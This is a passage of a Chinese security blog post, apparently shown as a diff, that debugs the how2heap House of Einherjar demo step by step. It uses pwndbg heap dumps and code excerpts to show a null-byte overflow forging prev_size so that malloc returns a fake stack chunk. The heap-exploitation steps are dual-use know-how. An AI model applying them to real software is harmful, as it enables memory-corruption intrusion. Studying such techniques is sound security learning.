class="hljs-keyword">by</span>-one <span class="hljs-keyword">into</span> a malloc<span class="hljs-comment">&#x27;ed region with a null byte.</span><br><br>We allocate <span class="hljs-number">0</span>x38 bytes <span class="hljs-keyword">for</span> <span class="hljs-comment">&#x27;a&#x27;</span><br><span class="hljs-symbol">a:</span> <span class="hljs-number">0</span>x1767010<br>Since we want <span class="hljs-keyword">to</span> overflow <span class="hljs-comment">&#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: 0x38</span><br><br>We create a fake chunk wherever we want, <span class="hljs-keyword">in</span> this <span class="hljs-keyword">case</span> we<span class="hljs-comment">&#x27;ll create the chunk on the stack</span><br>However, you can also create the chunk <span class="hljs-keyword">in</span> the heap <span class="hljs-built_in">or</span> the bss, <span class="hljs-keyword">as</span> <span class="hljs-type">long</span> <span class="hljs-keyword">as</span> you know its address<br>We <span class="hljs-keyword">set</span> our fwd <span class="hljs-built_in">and</span> bck pointers <span class="hljs-keyword">to</span> point at the fake_chunk <span class="hljs-keyword">in</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">to</span> pass the unlink checks<br>(although we could <span class="hljs-keyword">do</span> the unsafe unlink technique here <span class="hljs-keyword">in</span> some scenarios)<br>Our fake chunk at <span class="hljs-number">0</span>x7ffc0cadecb0 looks <span class="hljs-built_in">like</span>:<br>prev_size (<span class="hljs-built_in">not</span> used): <span class="hljs-number">0</span>x100<br><span class="hljs-symbol">size:</span> <span class="hljs-number">0</span>x100<br><span class="hljs-symbol">fwd:</span> <span class="hljs-number">0</span>x7ffc0cadecb0<br><span class="hljs-symbol">bck:</span> <span class="hljs-number">0</span>x7ffc0cadecb0<br><span class="hljs-symbol">fwd_nextsize:</span> <span class="hljs-number">0</span>x7ffc0cadecb0<br><span class="hljs-symbol">bck_nextsize:</span> <span class="hljs-number">0</span>x7ffc0cadecb0<br><br>We allocate <span class="hljs-number">0</span>xf8 bytes <span class="hljs-keyword">for</span> <span class="hljs-comment">&#x27;b&#x27;.</span><br><span class="hljs-symbol">b:</span> <span class="hljs-number">0</span>x1767050<br><br>b.size: <span class="hljs-number">0</span>x101<br>b.size <span class="hljs-built_in">is</span>: (<span class="hljs-number">0</span>x100) | prev_inuse = <span class="hljs-number">0</span>x101<br>We overflow <span class="hljs-comment">&#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;</span><br>b.size: <span class="hljs-number">0</span>x100<br>This <span class="hljs-built_in">is</span> easiest <span class="hljs-keyword">if</span> b.size <span class="hljs-built_in">is</span> a multiple <span class="hljs-keyword">of</span> <span class="hljs-number">0</span>x100 so you don<span class="hljs-comment">&#x27;t change the size of b, only its prev_inuse bit</span><br><span class="hljs-keyword">If</span> it had been modified, we would need a fake chunk inside b <span class="hljs-keyword">where</span> it will <span class="hljs-keyword">try</span> <span class="hljs-keyword">to</span> consolidate the <span class="hljs-keyword">next</span> chunk<br><br>We write a fake prev_size <span class="hljs-keyword">to</span> the last <span class="hljs-number">8</span> bytes <span class="hljs-keyword">of</span> a so that it will consolidate <span class="hljs-keyword">with</span> our fake chunk<br>Our fake prev_size will be <span class="hljs-number">0</span>x1767040 - <span class="hljs-number">0</span>x7ffc0cadecb0 = <span class="hljs-number">0</span>xffff8003f4c88390<br><br>Modify fake chunk<span class="hljs-comment">&#x27;s size to reflect b&#x27;s new prev_size</span><br>Now we free b <span class="hljs-built_in">and</span> this will consolidate <span class="hljs-keyword">with</span> our fake chunk since b prev_inuse <span class="hljs-built_in">is</span> <span class="hljs-built_in">not</span> <span class="hljs-keyword">set</span><br>Our fake chunk size <span class="hljs-built_in">is</span> now <span class="hljs-number">0</span>xffff8003f4ca9351 (b.size + fake_prev_size)<br><br>Now we can <span class="hljs-keyword">call</span> malloc() <span class="hljs-built_in">and</span> it will begin <span class="hljs-keyword">in</span> our fake chunk<br><span class="hljs-keyword">Next</span> malloc(<span class="hljs-number">0</span>x200) <span class="hljs-built_in">is</span> at <span class="hljs-number">0</span>x7ffc0cadecc0<br></code></pre></td></tr></table></figure>
+
+<h2 id="关键部分调试"><a href="#关键部分调试" class="headerlink" title="关键部分调试"></a>关键部分调试</h2><p>断点如下</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-number">24</span>   a = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x38</span>);<br>► <span class="hljs-number">25</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;a: %p\n&quot;</span>, a);<br>  <span class="hljs-number">26</span><br><br>  <span class="hljs-number">41</span>     fake_chunk[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">// bck</span><br>  <span class="hljs-number">42</span>     fake_chunk[<span class="hljs-number">4</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">//fwd_nextsize</span><br>  <span class="hljs-number">43</span>     fake_chunk[<span class="hljs-number">5</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">//bck_nextsize</span><br>► <span class="hljs-number">44</span><br>  <span class="hljs-number">45</span><br><br>  <span class="hljs-number">57</span>   b = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xf8</span>);<br>► <span class="hljs-number">58</span>     <span class="hljs-type">int</span> real_b_size = <span class="hljs-built_in">malloc_usable_size</span>(b);<br><br>  <span class="hljs-number">69</span>   a[real_a_size] = <span class="hljs-number">0</span>;<br>► <span class="hljs-number">70</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br><br>  <span class="hljs-number">79</span>     <span class="hljs-type">size_t</span> fake_size = (<span class="hljs-type">size_t</span>)((b-<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">2</span>) - (<span class="hljs-type">uint8_t</span>*)fake_chunk);<br>► <span class="hljs-number">80</span>     <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, b-<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">2</span>, fake_chunk, fake_size);<br><br>► <span class="hljs-number">81</span>     *(<span class="hljs-type">size_t</span>*)&amp;a[real_a_size-<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>)] = fake_size;<br><br>  <span class="hljs-number">83</span>     <span class="hljs-comment">//Change the fake chunk&#x27;s size to reflect b&#x27;s new prev_size</span><br>  <span class="hljs-number">84</span>     <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nModify fake chunk&#x27;s size to reflect b&#x27;s new prev_size\n&quot;</span>);<br>► <span class="hljs-number">85</span>     fake_chunk[<span class="hljs-number">1</span>] = fake_size;<br><br>  <span class="hljs-number">89</span>     <span class="hljs-built_in">free</span>(b);<br>► <span class="hljs-number">90</span>     <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, fake_chunk[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-number">104</span>     d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br>► <span class="hljs-number">105</span>     <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Next malloc(0x200) is at %p\n&quot;</span>, d);<br><br></code></pre></td></tr></table></figure>
+
+<p>好了，下面直接开始调试，首先是chunk a</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x603000</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">65</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603040</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">135105</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后在我们给我们的fake_chunk赋值之后</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; p/x fake_chunk<br><span class="hljs-number">$2</span> = &#123;<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>, <span class="hljs-number">0x7fffffffe600</span>, <span class="hljs-number">0x7fffffffe600</span>, <span class="hljs-number">0x7fffffffe600</span>, <span class="hljs-number">0x7fffffffe600</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>也就是</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">$3</span> = &#123;<br>  prev_size = <span class="hljs-number">256</span>,<br>  size = <span class="hljs-number">256</span>,<br>  fd = <span class="hljs-number">0x7fffffffe600</span>,<br>  bk = <span class="hljs-number">0x7fffffffe600</span>,<br>  fd_nextsize = <span class="hljs-number">0x7fffffffe600</span>,<br>  bk_nextsize = <span class="hljs-number">0x7fffffffe600</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>随后程序malloc了b</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x603000</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">65</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603040</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">257</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603140</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">134849</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后给a[real_a_size]赋0x00,也就是</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x603048</span><br><span class="hljs-number">0x603048</span>:       <span class="hljs-number">0</span>x0000<span class="hljs-number">000000000100</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603058</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603068</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603078</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603088</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure>
+
+<p>之后设置fake_si’ze为b和fake_chunk的差值</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x b-0x10</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">16 = 0x603040</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x &amp;fake_chunk</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">17 = 0x7fffffffe600</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x 0x603040-0x7fffffffe600</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">18 = 0xffff800000604a40</span><br><span class="hljs-meta prompt_">pwndbg&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>之后程序将b的pre_size设为了fake_size</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs nix">pwndbg<span class="hljs-operator">&gt;</span> heap<br><span class="hljs-number">0</span>x603000 FASTBIN &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">65</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x603040 &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">18446603336227506752</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">256</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x603140 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">134849</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br>pwndbg<span class="hljs-operator">&gt;</span> p<span class="hljs-symbol">/x</span> <span class="hljs-number">18446603336227506752</span><br>$<span class="hljs-number">30</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>xffff800000604a40<br></code></pre></td></tr></table></figure>
+
+<p>一切就绪之后,程序将fake_chunk的szie设为了fake_chunk</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; p/x fake_chunk<br><span class="hljs-number">$32</span> = &#123;<span class="hljs-number">0x100</span>, <span class="hljs-number">0xffff800000604a40</span>, <span class="hljs-number">0x7fffffffe600</span>, <span class="hljs-number">0x7fffffffe600</span>, <span class="hljs-number">0x7fffffffe600</span>, <span class="hljs-number">0x7fffffffe600</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>也就是</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">$34</span> = &#123;<br>  prev_size = <span class="hljs-number">0x100</span>,<br>  size = <span class="hljs-number">0xffff800000604a40</span>,<br>  fd = <span class="hljs-number">0x7fffffffe600</span>,<br>  bk = <span class="hljs-number">0x7fffffffe600</span>,<br>  fd_nextsize = <span class="hljs-number">0x7fffffffe600</span>,<br>  bk_nextsize = <span class="hljs-number">0x7fffffffe600</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>现在我们再free b,程序通过pre_size就会去找我们的fake chunk,又发现我们的fake_chunk也是free态,因此就会与我们的fake_chunk合并,现在我们再malloc的话</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x d-0x10</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">39 = 0x7fffffffe600</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>程序首先malloc了chunk a(0x38)</p>
+<p>之后呢在栈上创建了fake chunk,并且伪造了fake chunk的结构</p>
+<p>随后程序又malloc了chunk b(0xf8),b和top chunk相邻</p>
+<p>我们计算量b和fake chunk的地址差后,将b的pre_size设为了我们的差值,并把b的pre_inuse置0,之后free掉了b</p>
+<p>此时b就通过pre_size找到了我们的fake chunk并且与我们的fake chunk合并了,现在我们再申请一个chunk,就会从fake chunk那分配了</p>
+<p>over~</p>
+<p>文章首发于安全客，转载请著名出处，文章链接<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/197667">https://www.anquanke.com/post/id/197667</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>how2heap总结计划五</div>
+      <div>https://nightrainy.github.io/2020/01/29/how2heap总结计划五/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>知世</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2020年1月29日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                    <i class="iconfont icon-cc-nc"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="ND - 禁止演绎">
+                    <i class="iconfont icon-cc-nd"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/02/01/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E5%85%AD/" title="how2heap总结计划六">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">how2heap总结计划六</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/01/21/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E5%9B%9B/" title="how2heap总结计划四">
+                        <span class="hidden-mobile">how2heap总结计划四</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
